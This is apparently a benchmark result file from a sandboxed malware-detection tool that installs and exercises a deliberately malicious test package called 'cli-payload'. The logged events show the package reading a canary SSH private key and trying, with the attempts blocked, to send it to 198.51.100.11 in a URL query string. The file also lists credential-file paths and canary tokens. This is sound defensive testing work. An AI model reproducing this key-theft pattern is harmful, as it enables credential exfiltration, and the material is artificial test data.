@@ -1,0 +1,611 @@
+{
+ "schema_version": "1.0",
+ "package": {
+  "name": "cli-payload",
+  "version": "0.1",
+  "ecosystem": "pypi",
+  "sha256": "cf3ceaf4e457970b24b3f8fe51ca2e880392a895f072c59c8754d70cff0a2647",
+  "path": "bench/packages/malicious/cli_payload"
+ },
+ "run": {
+  "sandbox": "bwrap",
+  "network": "sinkhole",
+  "canaries": [
+   "ssh_key",
+   "aws_creds",
+   "npmrc",
+   "gcloud_creds",
+   "docker_config",
+   "aws_secret_env",
+   "github_token_env"
+  ],
+  "phases": [
+   "install",
+   "startup",
+   "import",
+   "call",
+   "cli"
+  ],
+  "profiles": [
+   "dev",
+   "ci"
+  ],
+  "variants": [
+   "default",
+   "clock+30d"
+  ],
+  "started_at": "2026-10-27T11:55:56.995051+00:00",
+  "duration_s": 5.61,
+  "stub": false,
+  "tool_versions": {
+   "python": "Python 3.12.3",
+   "bwrap": "bubblewrap 0.9.0",
+   "strace": "strace -- version 6.8",
+   "libfaketime": "/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1"
+  }
+ },
+ "events": [
+  {
+   "id": "ev0",
+   "seq": 106,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "install_hook",
+   "detail": {
+    "file": "cli_payload-0.1.dist-info/entry_points.txt",
+    "cmd": "clipkg=cli_payload.cli:main"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "fs_diff",
+    "file": "cli_payload-0.1.dist-info/entry_points.txt",
+    "line": null
+   }
+  },
+  {
+   "id": "ev1",
+   "seq": 107,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r",
+    "count": 2
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 12,
+    "layer": "audit"
+   },
+   "count": 2
+  },
+  {
+   "id": "ev2",
+   "seq": 108,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": "",
+    "count": 2
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 13,
+    "layer": "audit"
+   },
+   "count": 2
+  },
+  {
+   "id": "ev3",
+   "seq": 111,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r",
+    "count": 2
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 12,
+    "layer": "audit"
+   },
+   "count": 2
+  },
+  {
+   "id": "ev4",
+   "seq": 112,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": "",
+    "count": 2
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 13,
+    "layer": "audit"
+   },
+   "count": 2
+  },
+  {
+   "id": "ev5",
+   "seq": 115,
+   "phase": "cli",
+   "trigger": "cli:clipkg",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 12,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev6",
+   "seq": 116,
+   "phase": "cli",
+   "trigger": "cli:clipkg",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 13,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev7",
+   "seq": 117,
+   "phase": "cli",
+   "trigger": "cli:clipkg",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 12,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev8",
+   "seq": 118,
+   "phase": "cli",
+   "trigger": "cli:clipkg",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 13,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev9",
+   "seq": 225,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "install_hook",
+   "detail": {
+    "file": "cli_payload-0.1.dist-info/entry_points.txt",
+    "cmd": "clipkg=cli_payload.cli:main"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "fs_diff",
+    "file": "cli_payload-0.1.dist-info/entry_points.txt",
+    "line": null
+   }
+  },
+  {
+   "id": "ev10",
+   "seq": 226,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r",
+    "count": 2
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 12,
+    "layer": "audit"
+   },
+   "count": 2
+  },
+  {
+   "id": "ev11",
+   "seq": 227,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": "",
+    "count": 2
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 13,
+    "layer": "audit"
+   },
+   "count": 2
+  },
+  {
+   "id": "ev12",
+   "seq": 230,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r",
+    "count": 2
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 12,
+    "layer": "audit"
+   },
+   "count": 2
+  },
+  {
+   "id": "ev13",
+   "seq": 231,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": "",
+    "count": 2
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 13,
+    "layer": "audit"
+   },
+   "count": 2
+  },
+  {
+   "id": "ev14",
+   "seq": 234,
+   "phase": "cli",
+   "trigger": "cli:clipkg",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 12,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev15",
+   "seq": 235,
+   "phase": "cli",
+   "trigger": "cli:clipkg",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 13,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev16",
+   "seq": 236,
+   "phase": "cli",
+   "trigger": "cli:clipkg",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 12,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev17",
+   "seq": 237,
+   "phase": "cli",
+   "trigger": "cli:clipkg",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.11/cli?key=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/cli_payload/cli.py",
+    "line": 13,
+    "layer": "audit"
+   }
+  }
+ ],
+ "static_signals": [],
+ "coverage": {
+  "phases_run": [
+   "install",
+   "startup",
+   "import",
+   "call",
+   "cli"
+  ],
+  "profiles_run": [
+   "dev",
+   "ci"
+  ],
+  "variants_run": [
+   "default",
+   "clock+30d"
+  ],
+  "triggers_run": [
+   "call_all",
+   "cli:clipkg",
+   "fresh_startup",
+   "import_all",
+   "install"
+  ],
+  "install_completed": true,
+  "install_note": null,
+  "network": "sinkhole",
+  "callables_total": 3,
+  "callables_exercised": 3,
+  "native_skipped": [],
+  "strace_layer": true,
+  "not_observed": [],
+  "whitelisted_or_dropped_events": 220
+ },
+ "canaries": [
+  {
+   "id": "ssh_key",
+   "kind": "file",
+   "where": ".ssh/id_rsa",
+   "token": "TLCANARYSSHKEY52662509b20a"
+  },
+  {
+   "id": "aws_creds",
+   "kind": "file",
+   "where": ".aws/credentials",
+   "token": "TLCANARYAWSCREDSee3e9a44483b"
+  },
+  {
+   "id": "npmrc",
+   "kind": "file",
+   "where": ".npmrc",
+   "token": "TLCANARYNPMRC8a70d436d510"
+  },
+  {
+   "id": "gcloud_creds",
+   "kind": "file",
+   "where": ".config/gcloud/application_default_credentials.json",
+   "token": "TLCANARYGCLOUDCREDSec828360651b"
+  },
+  {
+   "id": "docker_config",
+   "kind": "file",
+   "where": ".docker/config.json",
+   "token": "TLCANARYDOCKERCONFIG6394df27107c"
+  },
+  {
+   "id": "aws_secret_env",
+   "kind": "env",
+   "where": "AWS_SECRET_ACCESS_KEY",
+   "token": "TLCANARYAWSSECRETENV07d6cbc3a1d1"
+  },
+  {
+   "id": "github_token_env",
+   "kind": "env",
+   "where": "GITHUB_TOKEN",
+   "token": "TLCANARYGITHUBTOKENENVb449f704a5a7"
+  }
+ ],
+ "capability_summary": {
+  "fs_read_sensitive": {
+   "phases": [
+    "call",
+    "cli"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 8,
+   "canary_hit": true
+  },
+  "install_hook": {
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": true,
+   "count": 2,
+   "canary_hit": false
+  },
+  "network": {
+   "phases": [
+    "call",
+    "cli"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 8,
+   "canary_hit": false
+  }
+ }
+}
